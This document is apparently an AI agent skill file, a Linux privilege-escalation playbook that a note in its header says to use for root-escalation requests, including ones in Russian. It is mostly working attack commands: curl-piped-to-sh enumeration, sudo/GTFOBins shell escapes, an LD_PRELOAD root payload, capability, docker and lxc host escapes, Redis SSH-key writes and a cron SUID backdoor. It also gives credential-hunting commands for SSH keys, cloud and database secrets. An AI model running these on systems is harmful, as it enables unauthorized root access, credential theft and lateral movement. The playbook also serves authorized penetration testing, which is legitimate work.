---
name: pt-privesc-linux
description: Use when a shell on a Linux host must be escalated to root or used to reach credentials and adjacent systems — sudo and SUID abuse, capabilities, cron and systemd, writable paths, container escape, credential hunting, kernel exploits — including Russian requests (повышение привилегий в Linux, получить root, приваты, эскалация). Also use during post-exploitation on Linux servers.
version: 1.0.0
author: operator
tags: [offensive, linux, privesc, post-exploitation, root]
---

# Linux Privilege Escalation

Enumeration is 80% of the work. The order below is deliberate: **misconfigurations first** (fast, reliable, low noise), kernel exploits last (crash risk, version-dependent).

## Phase 1: Automated baseline, read by hand

```bash
# Run, then read — do not just paste the output into a report
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.out
./lse.sh -l2                     # linux-smart-enumeration, quieter
./pspy64 -pf -i 1000             # watch cron/jobs run in real time
```

`linpeas` red/yellow highlights are leads, not findings. Every one needs a manual confirmation command.

## Phase 2: Identity and sudo

```bash
id; sudo -n -l; sudo -l              # -n: no prompt, reveals NOPASSWD
cat /etc/sudoers 2>/dev/null; ls -l /etc/sudoers.d/
```

For any allowed command, check **GTFOBins**:

```text
sudo vim            -> :!/bin/sh
sudo less /etc/hosts -> !/bin/sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
```

`env_keep` with `LD_PRELOAD` or `LD_LIBRARY_PATH` is a direct root path:

```bash
# if sudo -l shows: env_keep+=LD_PRELOAD
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) void p(){ setuid(0); setgid(0); system("/bin/sh -p"); }
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>
```

## Phase 3: Files, capabilities, cron

```bash
find / -perm -4000 -type f 2>/dev/null                    # SUID
find / -perm -2000 -type f 2>/dev/null                    # SGID
getcap -r / 2>/dev/null                                   # capabilities
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)'
find / -writable -type f -not -path '/proc/*' 2>/dev/null | head -50
```

Dangerous capabilities: `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_net_raw`.

```text
getcap /usr/bin/python3.9 -> cap_setuid+ep
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Cron and timers:

```bash
cat /etc/crontab; ls -l /etc/cron.*; crontab -l; ls -l /var/spool/cron/crontabs/
systemctl list-timers --all
# writable script referenced by root cron == root
# PATH in cron without absolute paths == PATH hijack from /tmp
```

## Phase 4: Services and installed software

- Writable systemd unit or drop-in (`/etc/systemd/system/*.service`) → `ExecStart` root execution
- Writable file in a root-run service's `PATH`
- `screen`/`tmux` sockets owned by root; `docker` group membership
- Old service binaries: `dpkg -l`, `rpm -qa`, then `searchsploit`

```bash
# Docker group = root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# LXD/LXC group = root
lxc image import ./alpine.tar.gz --alias x && lxc init x p -c security.privileged=true \
  && lxc config device add p h disk source=/ path=/mnt/root recursive=true && lxc start p
```

## Phase 5: Credential hunting

```bash
grep -rIl -E 'password|passwd|secret|api[_-]?key|token' / 2>/dev/null \
  | grep -vE '^/(proc|sys)' | head -100
cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null
find / -name '*.git-credentials' -o -name 'id_rsa' -o -name '.env' 2>/dev/null
# config files that matter
#  /var/www/**/wp-config.php  /var/www/**/.env  /etc/mysql/*.cnf  /etc/redis/redis.conf
#  ~/.aws/credentials  ~/.kube/config  ~/.docker/config.json  /etc/ansible/hosts
```

SSH key material is often a **lateral** win, not a local one: check `authorized_keys` and known hosts for reachable neighbours.

## Phase 6: Database and application footholds

```bash
mysql -u root -p'' -e 'select user,password from mysql.user'          # often root shell via UDF
# PostgreSQL: COPY ... TO PROGRAM, or superuser + pg_read_file
# Redis: config set dir /root/.ssh; config set dbfilename authorized_keys
# Jenkins/GitLab/Tomcat: script console / manager app / deploy war
```

## Phase 7: Containers and escapes

- `cap_sys_admin` + `mount` → host filesystem
- `--privileged` container → `mount /dev/sda1 /mnt`
- `docker.sock` mounted → `docker -H unix:///var/run/docker.sock run -v /:/mnt alpine chroot /mnt sh`
- Writable `/proc/sys/kernel/core_pattern` → host code execution on crash
- `hostPath` volumes — read `/etc/shadow` directly

## Phase 8: Kernel exploits — last

```bash
uname -a; cat /etc/os-release; lsb_release -a
searchsploit "Linux Kernel $(uname -r | cut -d- -f1)"
# DirtyPipe, DirtyCOW, PwnKit (pkexec), Baron Samedit (sudo), overlayfs, nf_tables
```

Rules: check the exact patch level against the `sysinfo` and distro patch backports; take a snapshot in lab first; a kernel exploit that panics the host ends the engagement. Prefer a misconfiguration that is already there.

## Recording

One file per host, `notes\host-<name>.md`:

```markdown
## Host: WEB01 (10.10.0.11) — user: www-data
| Vector | Confirmed | Command | Result |
|---|---|---|---|
| sudo tar NOPASSWD | yes | sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh | root |
| /opt/backup.sh writable, root cron | yes | echo 'chmod +s /bin/bash' >> /opt/backup.sh | root@WEB01 |
## Loot
- /home/deploy/.ssh/id_rsa -> loot/keys/WEB01-deploy
- DB creds in /var/www/app/.env -> loot/creds/WEB01-db
```

## Common mistakes

| Mistake | Reality |
|---|---|
| Pasting linpeas output as the finding | No confirmation, no reproduction, fails retest |
| Jumping to a kernel exploit | Highest crash risk, lowest reliability |
| Ignoring `sudo -l` output details | The specific binary and flags are the whole attack |
| Missing GTFOBins | Every allowed binary has an escape or none exists |
| Forgetting lateral creds | A user shell with an SSH key to another host is progress |
| No cleanup of created SUID files | Leaves the client compromised after you leave |
| Not checking container context | You may be escalating inside the container, not the host |
